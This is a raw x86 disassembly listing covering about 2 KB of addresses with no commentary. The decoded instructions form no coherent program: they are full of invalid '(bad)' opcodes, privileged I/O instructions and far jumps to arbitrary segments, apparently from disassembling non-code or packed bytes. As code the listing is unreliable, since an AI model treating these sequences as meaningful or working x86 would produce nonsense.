  40e1da:	es (bad) 
  40e1dc:	int3   
  40e1dd:	push   ss
  40e1de:	inc    esi
  40e1df:	mov    al,ds:0xa4466b9f
  40e1e4:	mov    esp,0xb4dd6a34
  40e1e9:	aam    0x4d
  40e1eb:	cmp    DWORD PTR [ebx+0x1],0x67f9e9b8
  40e1f2:	push   cs
  40e1f3:	add    al,0x2e
  40e1f5:	fdiv   st,st(1)
  40e1f7:	xor    eax,0x5fcef012
  40e1fc:	cmp    eax,0x50fabdf4
  40e201:	jae    0x40e263
  40e203:	xlat   BYTE PTR ds:[ebx]
  40e204:	bnd addr16 jae 0x40e219
  40e208:	sbb    eax,0x3f2a002f
  40e20d:	add    eax,0xd64b057
  40e212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e213:	xchg   DWORD PTR [edi],ecx
  40e215:	adc    BYTE PTR [edi],dl
  40e217:	push   eax
  40e218:	push   0x4693b32b
  40e21d:	xchg   edi,eax
  40e21e:	lock mov eax,db6
  40e222:	push   ebp
  40e223:	xor    BYTE PTR [ebp+0x35],ch
  40e226:	mov    ecx,0x99c6f484
  40e22b:	mul    BYTE PTR [ebx+esi*4+0x31]
  40e22f:	xchg   ebp,eax
  40e230:	cmc    
  40e231:	pop    edx
  40e232:	or     ch,BYTE PTR [edx]
  40e234:	jg     0x40e250
  40e236:	shl    BYTE PTR cs:[esi],0xe9
  40e23a:	xchg   esp,eax
  40e23b:	fs and al,0xc6
  40e23e:	pop    es
  40e23f:	shr    DWORD PTR [edx+eiz*4],0x4a
  40e243:	or     dh,BYTE PTR [ebx-0x19e6e659]
  40e249:	test   eax,0x59697aed
  40e24e:	ficom  WORD PTR [eax*4+0x68d500aa]
  40e255:	adc    DWORD PTR [esi+0x66],ebx
  40e258:	(bad)
  40e25b:	sbb    BYTE PTR [edx-0x33],dh
  40e25e:	aam    0xc1
  40e260:	(bad)  
  40e262:	jne    0x40e27d
  40e264:	dec    esp
  40e265:	xchg   BYTE PTR [ecx],al
  40e267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e268:	fild   DWORD PTR [esi-0x7b]
  40e26b:	pop    ecx
  40e26c:	inc    edx
  40e26d:	das    
  40e26e:	std    
  40e26f:	loope  0x40e235
  40e271:	cmc    
  40e272:	lahf   
  40e273:	retf   0x173c
  40e276:	cli    
  40e277:	adc    DWORD PTR [esi],ebx
  40e279:	and    BYTE PTR [edx+0x5a34ec80],ah
  40e27f:	gs jne 0x40e279
  40e282:	sbb    dh,0xa5
  40e285:	mov    DWORD PTR [edi],edi
  40e287:	ror    DWORD PTR [edi],1
  40e289:	cwde   
  40e28a:	and    al,0x4d
  40e28c:	sub    esp,DWORD PTR [ebp-0x52]
  40e28f:	jnp    0x40e2a9
  40e291:	and    eax,0x3e3de156
  40e296:	ins    DWORD PTR es:[edi],dx
  40e297:	cmp    DWORD PTR [ecx-0x32de058c],0xffffffa9
  40e29e:	jmp    0x1edfb08c
  40e2a3:	mov    cs,WORD PTR [ecx]
  40e2a5:	mov    WORD PTR ds:0xc5ceac71,ds
  40e2ab:	clc    
  40e2ac:	js     0x40e265
  40e2ae:	mov    esi,0xcbe262f2
  40e2b3:	into   
  40e2b4:	enter  0x24c6,0x86
  40e2b8:	pop    ecx
  40e2b9:	push   esi
  40e2ba:	jl     0x40e2b8
  40e2bc:	ret    
  40e2bd:	xchg   esp,eax
  40e2be:	inc    ecx
  40e2bf:	in     eax,0xa0
  40e2c1:	loop   0x40e2f2
  40e2c3:	lods   eax,DWORD PTR ds:[esi]
  40e2c4:	and    eax,0x14bd6a05
  40e2c9:	jo     0x40e323
  40e2cb:	outs   dx,DWORD PTR ds:[esi]
  40e2cc:	mov    DWORD PTR [ecx-0x1ff3e2d6],esp
  40e2d2:	mov    al,ds:0x185f134f
  40e2d7:	cmp    al,BYTE PTR ds:0x41911826
  40e2dd:	stos   DWORD PTR es:[edi],eax
  40e2de:	or     BYTE PTR [edx+0x369f7068],al
  40e2e4:	and    DWORD PTR [esi+0x61],0xd21ef239
  40e2eb:	loope  0x40e26e
  40e2ed:	adc    eax,0xda803941
  40e2f2:	mov    ebp,0x2c44e4aa
  40e2f7:	xchg   ecx,eax
  40e2f8:	jmp    0x40e2b7
  40e2fa:	int    0xfa
  40e2fc:	pop    edi
  40e2fd:	cmp    edx,ebx
  40e2ff:	sub    ecx,DWORD PTR [edi]
  40e301:	sub    al,0xf8
  40e303:	ret    0x7f18
  40e306:	out    dx,eax
  40e307:	adc    ah,dh
  40e309:	pop    edx
  40e30a:	push   edi
  40e30b:	(bad)  
  40e30c:	iret   
  40e30d:	(bad)  
  40e30e:	xchg   ebp,eax
  40e30f:	cmp    eax,0xe414d48d
  40e314:	xor    DWORD PTR [ecx+0x53],eax
  40e317:	and    eax,0xa0934ff1
  40e31c:	mov    ebp,0x6b6582cb
  40e321:	mov    bh,BYTE PTR [edx-0x25]
  40e324:	scas   eax,DWORD PTR es:[edi]
  40e325:	push   0xffffffa0
  40e327:	cmp    eax,0x1b70a02e
  40e32c:	repz dec edi
  40e32e:	nop
  40e32f:	sbb    DWORD PTR [esi+0x78cf8bf4],ebp
  40e335:	(bad)  
  40e336:	cmp    eax,0x81184c64
  40e33b:	pop    esp
  40e33c:	cdq    
  40e33d:	pop    esi
  40e33e:	shl    BYTE PTR [edx-0x480190c],1
  40e344:	cld    
  40e345:	dec    edi
  40e346:	or     ebp,DWORD PTR [ecx+0x5e]
  40e349:	pop    esi
  40e34a:	emms   
  40e34c:	sbb    eax,0xd1943cdf
  40e351:	sub    edi,DWORD PTR [ebx+esi*4+0xc319662]
  40e358:	dec    edi
  40e359:	jp     0x40e37b
  40e35b:	xor    DWORD PTR [esi-0x68],esi
  40e35e:	test   BYTE PTR [ebx-0x3ce4a031],bh
  40e364:	popa   
  40e365:	mov    bl,0xeb
  40e367:	mov    dh,0xa9
  40e369:	and    eax,0x835314f9
  40e36e:	mov    al,0x9b
  40e370:	aam    0x32
  40e372:	mov    cl,0x41
  40e374:	in     al,dx
  40e375:	xchg   BYTE PTR [edi+0x55],bl
  40e378:	xchg   edi,eax
  40e379:	dec    esp
  40e37a:	fisttp QWORD PTR [ebp-0x6c]
  40e37d:	mov    ebx,0x84bb599b
  40e382:	pop    esi
  40e383:	sub    DWORD PTR [eax+ecx*4+0x3e],eax
  40e387:	sub    BYTE PTR [eax-0x2b66a04c],cl
  40e38d:	cmp    DWORD PTR [ecx+0x52edf643],edx
  40e393:	cmp    al,0xb9
  40e395:	call   DWORD PTR [eax-0x70fee47b]
  40e39b:	or     ch,BYTE PTR [esi-0x3c]
  40e39e:	xchg   edx,eax
  40e39f:	dec    esi
  40e3a0:	xchg   ebp,eax
  40e3a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3a2:	cdq    
  40e3a3:	lea    edi,ds:0x264372f7
  40e3a9:	and    edi,ecx
  40e3ab:	(bad)  
  40e3ac:	int    0xd3
  40e3ae:	inc    edi
  40e3af:	popa   
  40e3b0:	int3   
  40e3b1:	repz xor al,0x77
  40e3b4:	repz sbb eax,0xa8f1a5d9
  40e3ba:	shr    ecx,cl
  40e3bc:	mov    ch,0x69
  40e3be:	stc    
  40e3bf:	repnz ins DWORD PTR es:[edi],dx
  40e3c1:	mov    ch,0x99
  40e3c3:	dec    eax
  40e3c4:	mov    edi,?
  40e3c6:	sbb    dl,BYTE PTR [ecx-0x4b]
  40e3c9:	cdq    
  40e3ca:	cmp    ebp,edx
  40e3cc:	dec    ebx
  40e3cd:	das    
  40e3ce:	aam    0xeb
  40e3d0:	jne    0x40e410
  40e3d2:	add    BYTE PTR [ebx-0x4c],bl
  40e3d5:	mov    ebp,0xdce1df4f
  40e3da:	adc    eax,0x81c9a14c
  40e3df:	sub    edx,DWORD PTR [edx+0x5dd387f0]
  40e3e5:	fwait
  40e3e6:	rcr    BYTE PTR [ebx+0x24a318b2],1
  40e3ec:	xchg   cl,cl
  40e3ee:	loope  0x40e466
  40e3f0:	xchg   edi,eax
  40e3f1:	cmp    DWORD PTR [ebp-0x326eae3e],edi
  40e3f7:	xchg   ecx,eax
  40e3f8:	fisub  WORD PTR [edx-0x29]
  40e3fb:	cmp    BYTE PTR [eax-0x73],0xd7
  40e3ff:	loopne 0x40e3a3
  40e401:	rcr    BYTE PTR [edx-0x1f],1
  40e404:	scas   eax,DWORD PTR es:[edi]
  40e405:	inc    edi
  40e406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e407:	xor    BYTE PTR [edx-0x425192d1],0x50
  40e40e:	mov    ebp,0xed8aab42
  40e413:	adc    edi,edx
  40e415:	xor    al,0x6a
  40e417:	test   al,0x7c
  40e419:	ror    DWORD PTR [eax-0x50e9215e],1
  40e41f:	dec    edx
  40e420:	push   eax
  40e421:	xchg   ecx,eax
  40e422:	and    bl,bl
  40e424:	xor    al,0x32
  40e426:	es push 0xffffff8f
  40e429:	mov    DWORD PTR [edi-0x3b],ecx
  40e42c:	imul   edi,esi,0xba6b0d82
  40e432:	jg     0x40e3ec
  40e434:	arpl   WORD PTR ds:0x389b2bc2,dx
  40e43a:	push   ebx
  40e43b:	test   cl,dh
  40e43d:	outs   dx,BYTE PTR ds:[esi]
  40e43e:	dec    ax
  40e440:	add    eax,0xd210e3cb
  40e445:	mov    eax,ds:0xe4b13fbc
  40e44a:	and    dl,ch
  40e44c:	jmp    0x59aa:0x199b0c2f
  40e453:	loop   0x40e3f7
  40e455:	pop    ss
  40e456:	dec    eax
  40e457:	mov    eax,0x7b176b0b
  40e45c:	xor    eax,0xb4ccc418
  40e461:	fisubr WORD PTR [edx-0x600ea2fb]
  40e467:	jmp    0xae93:0x7ed4048
  40e46e:	pop    es
  40e46f:	pop    ebx
  40e470:	into   
  40e471:	inc    edx
  40e472:	rcr    BYTE PTR ds:0xbbf32e0f,1
  40e478:	add    al,0x26
  40e47a:	je     0x40e45d
  40e47c:	or     eax,DWORD PTR [eax]
  40e47e:	mov    ah,0x7f
  40e480:	aas    
  40e481:	sub    DWORD PTR [eax-0x1100d71d],ebx
  40e487:	ficomp DWORD PTR [edx]
  40e489:	fistp  DWORD PTR [ebx+0xfcc769d]
  40e48f:	div    DWORD PTR [ebx]
  40e491:	in     eax,0x4c
  40e493:	sbb    eax,0x4eba24c3
  40e498:	add    bh,ch
  40e49a:	pop    ds
  40e49b:	lods   eax,DWORD PTR ds:[esi]
  40e49c:	std    
  40e49d:	imul   edx,DWORD PTR [ecx-0x43],0xf4b2f8c7
  40e4a4:	addr16 xchg edi,esp
  40e4a7:	or     eax,0x93eb7e02
  40e4ac:	xchg   edi,eax
  40e4ad:	ror    esp,1
  40e4af:	sbb    BYTE PTR [esi],al
  40e4b1:	(bad)  
  40e4b2:	pop    ss
  40e4b3:	aas    
  40e4b4:	jne    0x40e4f9
  40e4b6:	scas   eax,DWORD PTR es:[edi]
  40e4b7:	cs mov cl,0x8c
  40e4ba:	sbb    eax,0x3e4e95b9
  40e4bf:	rcl    DWORD PTR [edi+0x9],1
  40e4c2:	mov    ds:0x9ec8f594,eax
  40e4c7:	sti    
  40e4c8:	sub    al,0xa8
  40e4ca:	xchg   ebp,eax
  40e4cb:	lea    edx,[ecx]
  40e4cd:	loopne 0x40e491
  40e4cf:	pop    edi
  40e4d0:	imul   esi,esi,0xf0359174
  40e4d6:	sub    eax,0xf4ffd714
  40e4db:	and    dh,bh
  40e4dd:	or     eax,0xdf028b61
  40e4e2:	(bad)  
  40e4e3:	lds    esi,FWORD PTR [ecx]
  40e4e5:	dec    ecx
  40e4e6:	out    0xa7,al
  40e4e8:	add    eax,0xee9e969e
  40e4ed:	in     eax,dx
  40e4ee:	jb     0x40e47a
  40e4f0:	pop    esi
  40e4f1:	shr    DWORD PTR [ebx],1
  40e4f3:	inc    ebx
  40e4f4:	sar    bh,1
  40e4f6:	xchg   esp,eax
  40e4f7:	xchg   edi,eax
  40e4f8:	cmp    al,ch
  40e4fa:	imul   esp,DWORD PTR [eax-0x7f],0x50afccdf
  40e501:	call   0xd272f17b
  40e506:	push   ebx
  40e507:	dec    ebx
  40e508:	nop
  40e509:	push   0x485596fc
  40e50e:	ins    BYTE PTR es:[edi],dx
  40e50f:	stos   BYTE PTR es:[edi],al
  40e510:	xchg   ebx,eax
  40e511:	xchg   ebp,eax
  40e512:	jl     0x40e4d8
  40e514:	pushf  
  40e515:	add    cl,BYTE PTR [ebx+0x3a]
  40e518:	jl     0x40e530
  40e51a:	in     al,0x6a
  40e51c:	sub    ebp,DWORD PTR [ecx]
  40e51e:	fiadd  WORD PTR [edi]
  40e520:	test   eax,0x4c40c6cd
  40e525:	inc    ebx
  40e526:	jmp    FWORD PTR [esi]
  40e528:	dec    esp
  40e529:	xor    cl,BYTE PTR [ecx+0x33]
  40e52c:	jmp    0xf596:0x1954db8f
  40e533:	cdq    
  40e534:	outs   dx,DWORD PTR ds:[esi]
  40e535:	mov    ecx,DWORD PTR [esp+eax*8]
  40e538:	test   bh,ch
  40e53a:	adc    al,0x7
  40e53c:	dec    esp
  40e53d:	sub    BYTE PTR [edi-0x182d6db9],ah
  40e543:	mov    bh,0x38
  40e545:	pop    esp
  40e546:	xchg   esp,eax
  40e547:	scas   al,BYTE PTR es:[edi]
  40e548:	and    eax,0x587d08c0
  40e54d:	push   0xb890f02f
  40e552:	mov    ecx,0x9b69a833
  40e557:	(bad)  
  40e558:	jnp    0x40e4f9
  40e55a:	push   ebx
  40e55b:	add    al,0x52
  40e55d:	xor    bh,BYTE PTR [ebx+eiz*2-0x29f3c29c]
  40e564:	inc    esp
  40e565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e566:	call   0x7a02:0x37cd6548
  40e56d:	jbe    0x40e5ac
  40e56f:	jns    0x40e5a8
  40e571:	mov    ebx,0xa1893
  40e576:	in     eax,dx
  40e577:	outs   dx,DWORD PTR ds:[esi]
  40e578:	dec    ebx
  40e579:	mov    ebx,0xacff71c7
  40e57e:	sbb    BYTE PTR [edx],dl
  40e580:	jle    0x40e601
  40e582:	add    al,0xd
  40e584:	xchg   esi,eax
  40e585:	xchg   ebp,eax
  40e586:	xor    esp,0xffffffa4
  40e589:	pop    es
  40e58a:	inc    edx
  40e58b:	mov    ah,0x72
  40e58d:	rcl    bl,1
  40e58f:	lods   al,BYTE PTR ds:[esi]
  40e590:	xor    eax,0x66aea86a
  40e595:	cdq    
  40e596:	xchg   esp,eax
  40e597:	mov    edx,0x16359364
  40e59c:	fidivr WORD PTR [edx-0x80]
  40e59f:	xchg   edi,eax
  40e5a0:	and    esi,DWORD PTR [eax-0x5ccc0418]
  40e5a6:	mov    ecx,0x988b2736
  40e5ab:	jno    0x40e52d
  40e5ad:	test   BYTE PTR [ecx],0xd6
  40e5b0:	inc    edx
  40e5b1:	shr    BYTE PTR [edx-0x7b66164d],0x33
  40e5b8:	mov    ah,0xc1
  40e5ba:	dec    esi
  40e5bb:	or     al,0x94
  40e5bd:	popa   
  40e5be:	pop    ss
  40e5bf:	aas    
  40e5c0:	cmp    edx,eax
  40e5c2:	and    eax,0x9a480ee9
  40e5c7:	clc    
  40e5c8:	lock in al,dx
  40e5ca:	retf   0x634f
  40e5cd:	out    0xc3,eax
  40e5cf:	outs   dx,DWORD PTR ds:[esi]
  40e5d0:	mov    al,ds:0xaf4a3e2
  40e5d5:	into   
  40e5d6:	ficom  DWORD PTR [esi+ecx*8-0x5345dd5e]
  40e5dd:	jno    0x40e639
  40e5df:	pop    es
  40e5e0:	and    al,BYTE PTR [ebp-0xff2d971]
  40e5e6:	push   ecx
  40e5e7:	shr    ch,0x17
  40e5ea:	jg     0x40e61b
  40e5ec:	dec    eax
  40e5ed:	(bad)  
  40e5ee:	push   eax
  40e5ef:	mov    BYTE PTR [ebx+0x7d0e2ce1],0x1a
  40e5f6:	push   ebp
  40e5f7:	es je  0x40e633
  40e5fa:	xor    ch,BYTE PTR [ecx]
  40e5fc:	sub    DWORD PTR [ecx+ecx*1-0x3b218f45],0xdc2aa0d8
  40e607:	xor    ebx,DWORD PTR [edx]
  40e609:	loop   0x40e5f3
  40e60b:	mov    edi,0x3b49e235
  40e610:	jb     0x40e651
  40e612:	cwde   
  40e613:	rcl    cl,cl
  40e615:	sbb    al,0x8b
  40e617:	add    bl,BYTE PTR [ebx+0x40]
  40e61a:	jecxz  0x40e628
  40e61c:	hlt    
  40e61d:	and    bh,ah
  40e61f:	out    dx,eax
  40e620:	rol    cl,cl
  40e622:	xor    bl,dh
  40e624:	xor    eax,0xb172cc39
  40e629:	pop    esp
  40e62a:	mov    eax,0x968f12f7
  40e62f:	cmp    ebx,DWORD PTR [ecx]
  40e631:	lock mov ch,0x4e
  40e634:	loopne 0x40e5ba
  40e636:	or     bh,ch
  40e638:	aaa    
  40e639:	sar    BYTE PTR [eax-0x63],1
  40e63c:	push   ss
  40e63d:	jecxz  0x40e652
  40e63f:	std    
  40e640:	and    BYTE PTR [ecx+0x55],cl
  40e643:	test   DWORD PTR [edi],0xdb8c4068
  40e649:	jg     0x40e5e8
  40e64b:	jns    0x40e6bd
  40e64d:	cwde   
  40e64e:	dec    ebx
  40e64f:	pop    ebp
  40e650:	xor    BYTE PTR ss:[ecx-0x62],al
  40e654:	outs   dx,BYTE PTR ds:[esi]
  40e655:	dec    ebp
  40e656:	sub    BYTE PTR [ebx-0x74068764],ch
  40e65c:	jno    0x40e671
  40e65e:	lahf   
  40e65f:	in     eax,dx
  40e660:	jl     0x40e60e
  40e662:	sub    ah,BYTE PTR [edx+0x5e47bb66]
  40e668:	jbe    0x40e6c0
  40e66a:	adc    al,0xee
  40e66c:	loopne 0x40e61c
  40e66e:	call   0xa61a:0x185f53f1
  40e675:	and    dl,BYTE PTR [ebx+0x79b5f622]
  40e67b:	push   0x1e
  40e67d:	dec    esi
  40e67e:	xor    BYTE PTR [eax+0x66],dh
  40e681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e682:	jmp    0xc68c:0x7c624574
  40e689:	cmc    
  40e68a:	cwde   
  40e68b:	lods   eax,DWORD PTR ds:[esi]
  40e68c:	jns    0x40e69f
  40e68e:	and    ch,cl
  40e690:	add    edi,ecx
  40e692:	or     dl,BYTE PTR [ebp+0xf]
  40e695:	adc    al,0x54
  40e697:	test   BYTE PTR [edi],ch
  40e699:	data16 and al,0xd8
  40e69c:	cmp    esi,edi
  40e69e:	stos   DWORD PTR es:[edi],eax
  40e69f:	out    dx,eax
  40e6a0:	xor    al,0x66
  40e6a2:	gs mov dh,0x4d
  40e6a5:	jnp    0x40e70f
  40e6a7:	popf   
  40e6a8:	sub    ebp,DWORD PTR [edi+edi*8+0x2e]
  40e6ac:	or     esp,DWORD PTR [edx]
  40e6ae:	and    eax,0xf070ea5f
  40e6b3:	cli    
  40e6b4:	(bad)  
  40e6b6:	xchg   edx,eax
  40e6b7:	and    al,0xf2
  40e6b9:	pop    ebx
  40e6ba:	iret   
  40e6bb:	add    BYTE PTR [edi+0x50],ah
  40e6be:	mov    bl,0xa0
  40e6c0:	pop    ebp
  40e6c1:	push   ss
  40e6c2:	jbe    0x40e6ae
  40e6c4:	imul   ebx,DWORD PTR [ebx+0x4facbea6],0x4e75c3a5
  40e6ce:	pusha  
  40e6cf:	mov    ebx,0x998d683c
  40e6d4:	idiv   BYTE PTR [esp+eax*2]
  40e6d7:	je     0x40e662
  40e6d9:	xchg   edx,eax
  40e6da:	addr16 std 
  40e6dc:	inc    DWORD PTR [edx]
  40e6de:	pushf  
  40e6df:	inc    eax
  40e6e0:	bound  eax,QWORD PTR ds:0x8e83bce4
  40e6e6:	dec    eax
  40e6e7:	or     eax,0xa256bdc0
  40e6ec:	shr    BYTE PTR ds:0xd2417628,0xf1
  40e6f3:	cli    
  40e6f4:	ins    BYTE PTR es:[edi],dx
  40e6f5:	loopne 0x40e6db
  40e6f7:	push   ss
  40e6f8:	xchg   edx,eax
  40e6f9:	je     0x40e689
  40e6fb:	mul    DWORD PTR [ebp+0x70]
  40e6fe:	lahf   
  40e6ff:	lock shl DWORD PTR [eax],cl
  40e702:	outs   dx,BYTE PTR ds:[esi]
  40e703:	retf   0xd859
  40e706:	or     esp,DWORD PTR [ebx+0x7e]
  40e709:	xlat   BYTE PTR ds:[bx]
  40e70b:	add    DWORD PTR [edx-0x3a],0xffffffd9
  40e70f:	mov    eax,ds:0x7e526ab1
  40e714:	adc    edi,esp
  40e716:	fbstp  TBYTE PTR [edi-0x218065dc]
  40e71c:	xor    al,0x5e
  40e71e:	mov    cl,0x76
  40e720:	pusha  
  40e721:	in     eax,0x6
  40e723:	sub    eax,0x942ce041
  40e728:	mov    al,0x62
  40e72a:	xchg   ebp,eax
  40e72b:	jmp    0x40e6e1
  40e72d:	adc    BYTE PTR [edx+ecx*4],bh
  40e730:	push   esi
  40e731:	jae    0x40e700
  40e733:	adc    BYTE PTR [ebp-0x28],0xb2
  40e737:	enter  0xc9f9,0x2b
  40e73b:	or     eax,0x64c8e6ad
  40e740:	xlat   BYTE PTR ds:[ebx]
  40e741:	sbb    BYTE PTR [ebp-0x77221423],0x13
  40e748:	imul   edi,DWORD PTR [eax-0x1d56cd77],0x1f
  40e74f:	add    BYTE PTR [eax+0x596299b0],0xf2
  40e756:	ss lahf 
  40e758:	(bad)  
  40e759:	leave  
  40e75a:	sbb    al,0x75
  40e75c:	inc    ebp
  40e75d:	(bad)  
  40e75f:	cmc    
  40e760:	pop    ebx
  40e761:	mov    eax,ds:0x42237277
  40e766:	sub    al,0x92
  40e768:	retf   0x7f3
  40e76b:	or     dh,BYTE PTR [eax+edi*4]
  40e76e:	add    edx,DWORD PTR [edx+eiz*8+0xed2e73]
  40e775:	and    eax,esp
  40e777:	xchg   edi,esp
  40e779:	retf   
  40e77a:	fs dec ebx
  40e77c:	adc    ah,cl
  40e77e:	ins    BYTE PTR es:[edi],dx
  40e77f:	call   0x563:0xb673ebbd
  40e786:	mov    al,0xb5
  40e788:	mov    bl,bh
  40e78a:	inc    eax
  40e78b:	loope  0x40e796
  40e78d:	icebp  
  40e78e:	xor    eax,0x397db01f
  40e793:	call   FWORD PTR [esi-0x26]
  40e796:	xchg   ebp,eax
  40e797:	push   cs
  40e798:	shr    DWORD PTR [esi-0x3e],0x69
  40e79c:	neg    DWORD PTR [ecx-0x43f3a18d]
  40e7a2:	mov    eax,0x2ad5e03
  40e7a7:	rol    DWORD PTR [esi+eax*2+0x21afa971],cl
  40e7ae:	addr16 sub eax,0x774331fd
  40e7b4:	fidiv  DWORD PTR [eax+0x6720e09a]
  40e7ba:	popa   
  40e7bb:	ror    DWORD PTR [edi+eax*8-0x45],cl
  40e7bf:	dec    esi
  40e7c0:	and    eax,0xb2a0c3fb
  40e7c5:	xchg   esp,eax
  40e7c6:	xchg   esp,eax
  40e7c7:	aaa    
  40e7c8:	cdq    
  40e7c9:	xor    al,BYTE PTR [ebx]
  40e7cb:	xchg   esi,eax
  40e7cc:	inc    edi
  40e7cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7ce:	cdq    
  40e7cf:	ss in  eax,dx
  40e7d1:	xlat   BYTE PTR ds:[ebx]
  40e7d2:	push   0xffffffb8
  40e7d4:	xor    bh,BYTE PTR [edx]
  40e7d6:	mov    DWORD PTR [ebp-0x4945006d],ecx
  40e7dc:	pop    edi
  40e7dd:	loop   0x40e7ae
  40e7df:	(bad)  
  40e7e0:	push   ss
  40e7e1:	loop   0x40e77d
  40e7e3:	test   BYTE PTR ds:0xdd744940,dl
  40e7e9:	ret    0xeae7
  40e7ec:	pusha  
  40e7ed:	into   
  40e7ee:	shl    BYTE PTR [ecx],cl
  40e7f0:	aas    
  40e7f1:	mov    ah,BYTE PTR [ebx]
  40e7f3:	stos   BYTE PTR es:[edi],al
  40e7f4:	xchg   edi,eax
  40e7f5:	sbb    BYTE PTR [eax],dh
  40e7f7:	lods   eax,DWORD PTR ds:[esi]
  40e7f9:	rcr    DWORD PTR [ecx+0x2e6417ea],cl
  40e7ff:	mov    eax,0xe01da8bf
  40e804:	jle    0x40e82b
  40e806:	sbb    edi,DWORD PTR [edx]
  40e808:	mov    bh,0x55
  40e80a:	dec    ecx
  40e80b:	call   0xe5e7:0x2b4eb20b
  40e812:	div    BYTE PTR [edx]
  40e814:	adc    DWORD PTR [esi+0x2c],0x15
  40e818:	add    eax,0x5c94365a
  40e81d:	cli    
  40e81e:	or     ecx,DWORD PTR [esi+0x578b687a]
  40e824:	cmp    DWORD PTR [ebx-0x13],eax
  40e827:	cdq    
  40e828:	pop    esp
  40e829:	and    esp,ebp
  40e82b:	xlat   BYTE PTR ds:[ebx]
  40e82c:	add    DWORD PTR [bx-0x49],esp
  40e830:	gs mov ah,ch
  40e833:	add    DWORD PTR ds:0xd46b7d41,ecx
  40e839:	(bad)  
  40e83a:	mov    al,0xb0
  40e83c:	mov    ch,0x71
  40e83e:	add    BYTE PTR ds:0x7915e80e,dl
  40e844:	arpl   WORD PTR [eax-0x227ed0e0],dx
  40e84a:	not    DWORD PTR [ecx]
  40e84c:	jl     0x40e821
  40e84e:	jecxz  0x40e830
  40e850:	push   ebp
  40e851:	push   ebx
  40e852:	jg     0x40e84a
  40e854:	into   
  40e855:	ins    DWORD PTR es:[edi],dx
  40e856:	lods   eax,DWORD PTR ds:[esi]
  40e857:	add    al,0x5e
  40e859:	mov    al,0x6d
  40e85b:	ss pop ds
  40e85d:	xchg   DWORD PTR [edx-0x36],esp
  40e860:	xor    al,0xb0
  40e862:	aam    0x9d
  40e864:	xchg   ebx,eax
  40e865:	(bad)  
  40e866:	pop    edx
  40e867:	or     BYTE PTR [edx-0x34],bh
  40e86a:	mov    cl,0xb7
  40e86c:	mov    eax,0x96ed9c84
  40e871:	push   ds
  40e872:	inc    esi
  40e873:	jmp    0x40e892
  40e875:	xchg   ebp,eax
  40e876:	je     0x40e882
  40e878:	fmul   st(0),st
  40e87a:	ins    BYTE PTR es:[edi],dx
  40e87b:	in     al,dx
  40e87c:	push   edi
  40e87d:	jb     0x40e898
  40e87f:	lods   eax,DWORD PTR ds:[esi]
  40e880:	test   eax,0x64bba5ed
  40e885:	enter  0xf61d,0x82
  40e889:	add    al,0xcb
  40e88b:	call   FWORD PTR [ebp-0x25]
  40e88e:	xchg   esi,eax
  40e88f:	ins    DWORD PTR es:[edi],dx
  40e890:	or     DWORD PTR [ebp-0x66],0x150cfefd
  40e897:	mov    bl,0xd3
  40e899:	lds    edi,FWORD PTR [edx]
  40e89b:	dec    eax
  40e89c:	or     al,0x8f
  40e89e:	das    
  40e89f:	ss cld 
  40e8a1:	fisub  WORD PTR [edx]
  40e8a3:	inc    edx
  40e8a4:	js     0x40e902
  40e8a6:	fwait
  40e8a7:	xchg   BYTE PTR [ecx+0x56],bh
  40e8aa:	ss int 0x6
  40e8ad:	out    dx,eax
  40e8ae:	shl    DWORD PTR [edi],1
  40e8b0:	sub    eax,0x749eaa9b
  40e8b5:	std    
  40e8b6:	adc    eax,0xb54477ca
  40e8bb:	fsub   DWORD PTR [esi-0x3f887bfb]
  40e8c1:	(bad)  [ebp+0x68a9e9a8]
  40e8c7:	js     0x40e93d
  40e8c9:	leave  
  40e8ca:	aam    0x32
  40e8cc:	loopne 0x40e90f
  40e8ce:	jnp    0x40e8e5
  40e8d0:	inc    DWORD PTR [edx]
  40e8d2:	iret   
  40e8d3:	inc    esi
  40e8d4:	sbb    ch,0x38
  40e8d7:	shl    DWORD PTR [esi-0x40],0xa4
  40e8db:	or     BYTE PTR [ebp+0x31],0x23
  40e8df:	mov    bh,0xa8
  40e8e1:	add    esp,DWORD PTR [edi+ebp*2]
  40e8e4:	inc    edx
  40e8e5:	popa   
  40e8e6:	lds    ebx,FWORD PTR [edi-0x5d846dc3]
  40e8ec:	test   DWORD PTR [ebp+0x1b24f421],0x79c911af
  40e8f6:	xor    edx,DWORD PTR [ebx-0x5a]
  40e8f9:	out    0x8d,al
  40e8fb:	push   0x89c8917d
  40e900:	xchg   esp,eax
  40e901:	pop    ds
  40e902:	imul   esp,DWORD PTR [ebp-0x6f80761c],0x9ff59e56
  40e90c:	dec    eax
  40e90d:	mov    ds,WORD PTR [edx]
  40e90f:	sub    al,BYTE PTR [edx+0x40c7a04]
  40e915:	in     al,0xd6
  40e917:	inc    ebx
  40e918:	adc    eax,0x10ba7df5
  40e91d:	neg    BYTE PTR [esi+0x7105de57]
  40e923:	xchg   edx,eax
  40e924:	pop    esi
  40e925:	add    DWORD PTR [esi+edx*4],edi
  40e928:	iret   
  40e929:	lods   eax,DWORD PTR ds:[esi]
  40e92a:	xchg   BYTE PTR [eax+0x2a2a14cd],dl
  40e930:	addr16 icebp 
  40e932:	jne    0x40e97b
  40e934:	and    al,0x25
  40e936:	lahf   
  40e937:	push   ecx
  40e938:	inc    esi
  40e939:	idiv   edx
  40e93b:	ins    DWORD PTR es:[edi],dx
  40e93c:	(bad)  
  40e93d:	and    ch,BYTE PTR [edx+0x38579e5d]
  40e943:	inc    edi
  40e945:	out    dx,al
  40e946:	xchg   ecx,eax
  40e947:	mov    al,0xdb
  40e949:	dec    esp
  40e94a:	lods   eax,DWORD PTR ds:[esi]
  40e94b:	push   es
  40e94c:	out    0x5a,al
  40e94e:	outs   dx,DWORD PTR ds:[esi]
  40e94f:	push   eax
  40e950:	outs   dx,BYTE PTR ds:[esi]
  40e951:	aam    0xb7
  40e953:	and    BYTE PTR [ebp+0x26],cl
  40e956:	jbe    0x40e98a
  40e958:	or     BYTE PTR [edx-0xf25f4fa],bl
  40e95e:	xchg   ebx,eax
  40e95f:	sti    
  40e960:	int    0x69
  40e962:	in     al,0x7f
  40e964:	push   ds
  40e965:	pushf  
  40e966:	and    ebx,DWORD PTR [edi-0x35]
